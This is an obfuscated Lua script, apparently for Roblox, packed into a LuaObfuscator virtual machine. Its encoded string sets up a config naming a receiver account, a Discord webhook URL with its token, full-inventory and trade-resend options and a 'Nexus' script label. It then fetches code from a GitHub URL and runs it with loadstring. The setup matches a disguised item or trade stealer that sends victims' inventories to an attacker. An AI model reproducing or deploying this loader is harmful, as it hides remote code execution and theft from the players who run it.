--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			local FlatIdent_324DE = 0;
			while true do
				if (0 == FlatIdent_324DE) then
					repeatNext = StrToNumber(Sub(byte, 1, 1));
					return "";
				end
			end
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local FlatIdent_7126A = 0;
				local b;
				while true do
					if (FlatIdent_7126A == 1) then
						return b;
					end
					if (FlatIdent_7126A == 0) then
						b = Rep(a, repeatNext);
						repeatNext = nil;
						FlatIdent_7126A = 1;
					end
				end
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local FlatIdent_35A31 = 0;
			local Res;
			while true do
				if (FlatIdent_35A31 == 0) then
					Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
					return Res - (Res % 1);
				end
			end
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local FlatIdent_2661B = 0;
		local a;
		while true do
			if (FlatIdent_2661B == 1) then
				return a;
			end
			if (FlatIdent_2661B == 0) then
				a = Byte(ByteString, DIP, DIP);
				DIP = DIP + 1;
				FlatIdent_2661B = 1;
			end
		end
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local FlatIdent_189F0 = 0;
		local a;
		local b;
		local c;
		local d;
		while true do
			if (FlatIdent_189F0 == 1) then
				return (d * 16777216) + (c * 65536) + (b * 256) + a;
			end
			if (FlatIdent_189F0 == 0) then
				a, b, c, d = Byte(ByteString, DIP, DIP + 3);
				DIP = DIP + 4;
				FlatIdent_189F0 = 1;
			end
		end
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				local FlatIdent_8D1A5 = 0;
				while true do
					if (0 == FlatIdent_8D1A5) then
						Exponent = 1;
						IsNormal = 0;
						break;
					end
				end
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local FlatIdent_8B523 = 0;
			local Type;
			local Cons;
			while true do
				if (FlatIdent_8B523 == 1) then
					if (Type == 1) then
						Cons = gBits8() ~= 0;
					elseif (Type == 2) then
						Cons = gFloat();
					elseif (Type == 3) then
						Cons = gString();
					end
					Consts[Idx] = Cons;
					break;
				end
				if (FlatIdent_8B523 == 0) then
					Type = gBits8();
					Cons = nil;
					FlatIdent_8B523 = 1;
				end
			end
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					local FlatIdent_61EE = 0;
					while true do
						if (0 == FlatIdent_61EE) then
							Inst[3] = gBits16();
							Inst[4] = gBits16();
							break;
						end
					end
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					local FlatIdent_7366E = 0;
					while true do
						if (0 == FlatIdent_7366E) then
							Inst[3] = gBits32() - (2 ^ 16);
							Inst[4] = gBits16();
							break;
						end
					end
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 7) then
					if (Enum <= 3) then
						if (Enum <= 1) then
							if (Enum == 0) then
								if (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local FlatIdent_8F047 = 0;
								local A;
								local B;
								while true do
									if (FlatIdent_8F047 == 0) then
										A = Inst[2];
										B = Stk[Inst[3]];
										FlatIdent_8F047 = 1;
									end
									if (FlatIdent_8F047 == 1) then
										Stk[A + 1] = B;
										Stk[A] = B[Inst[4]];
										break;
									end
								end
							end
						elseif (Enum == 2) then
							local FlatIdent_6FA1 = 0;
							local A;
							local T;
							local B;
							while true do
								if (FlatIdent_6FA1 == 1) then
									B = Inst[3];
									for Idx = 1, B do
										T[Idx] = Stk[A + Idx];
									end
									break;
								end
								if (0 == FlatIdent_6FA1) then
									A = Inst[2];
									T = Stk[A];
									FlatIdent_6FA1 = 1;
								end
							end
						else
							local FlatIdent_940A0 = 0;
							local B;
							local A;
							while true do
								if (FlatIdent_940A0 == 3) then
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									FlatIdent_940A0 = 4;
								end
								if (FlatIdent_940A0 == 6) then
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									FlatIdent_940A0 = 7;
								end
								if (FlatIdent_940A0 == 4) then
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									FlatIdent_940A0 = 5;
								end
								if (FlatIdent_940A0 == 8) then
									Stk[A] = B[Inst[4]];
									break;
								end
								if (0 == FlatIdent_940A0) then
									B = nil;
									A = nil;
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									FlatIdent_940A0 = 1;
								end
								if (2 == FlatIdent_940A0) then
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									FlatIdent_940A0 = 3;
								end
								if (FlatIdent_940A0 == 7) then
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									FlatIdent_940A0 = 8;
								end
								if (FlatIdent_940A0 == 5) then
									Env[Inst[3]] = Stk[Inst[2]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									FlatIdent_940A0 = 6;
								end
								if (FlatIdent_940A0 == 1) then
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									FlatIdent_940A0 = 2;
								end
							end
						end
					elseif (Enum <= 5) then
						if (Enum > 4) then
							Stk[Inst[2]] = Inst[3];
						else
							Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
						end
					elseif (Enum == 6) then
						local FlatIdent_E0D0 = 0;
						local A;
						local Results;
						local Limit;
						local Edx;
						while true do
							if (FlatIdent_E0D0 == 2) then
								for Idx = A, Top do
									local FlatIdent_5B2CE = 0;
									while true do
										if (FlatIdent_5B2CE == 0) then
											Edx = Edx + 1;
											Stk[Idx] = Results[Edx];
											break;
										end
									end
								end
								break;
							end
							if (FlatIdent_E0D0 == 0) then
								A = Inst[2];
								Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
								FlatIdent_E0D0 = 1;
							end
							if (FlatIdent_E0D0 == 1) then
								Top = (Limit + A) - 1;
								Edx = 0;
								FlatIdent_E0D0 = 2;
							end
						end
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
					end
				elseif (Enum <= 11) then
					if (Enum <= 9) then
						if (Enum == 8) then
							Stk[Inst[2]]();
						else
							local A = Inst[2];
							local T = Stk[A];
							for Idx = A + 1, Inst[3] do
								Insert(T, Stk[Idx]);
							end
						end
					elseif (Enum > 10) then
						VIP = Inst[3];
					else
						Stk[Inst[2]][Inst[3]] = Inst[4];
					end
				elseif (Enum <= 13) then
					if (Enum > 12) then
						do
							return;
						end
					else
						Env[Inst[3]] = Stk[Inst[2]];
					end
				elseif (Enum == 14) then
					Stk[Inst[2]] = Env[Inst[3]];
				else
					Stk[Inst[2]] = {};
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!143O00028O0003063O00436F6E66696703093O0052656365697665727303053O0065717A5F7303073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31322O36303433323539332O393034353334312F6C474C4158396F556A4955334E30634554516D774837336841706267483350365449653542695447417075334D594B6B4D5A4C6D7A5245536A4A384E755641696B705F6C030D3O0046752O6C496E76656E746F72792O01030D3O00472O6F644974656D734F6E6C790100030B3O00526573656E64547261646503073O002E726573656E6403063O0053637269707403053O004E65787573030A3O00437573746F6D4C696E6B034O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034E3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F523354482D505249562F55494C6962732F6D61696E2F4C696272617279732F496D706163742F536F7572636500193O0012053O00013O00264O00010001000100040B3O000100012O000F00013O00072O000F000200013O001205000300044O000200020001000100100400010003000200300300010005000600302O00010007000800302O00010009000A00302O0001000B000C00302O0001000D000E00302O0001000F001000122O000100023O00122O000100113O00122O000200123O00202O000200020013001205000400144O0006000200044O000700013O00022O000800010001000100040B3O0018000100040B3O000100012O000D3O00017O00", GetFEnv(), ...);
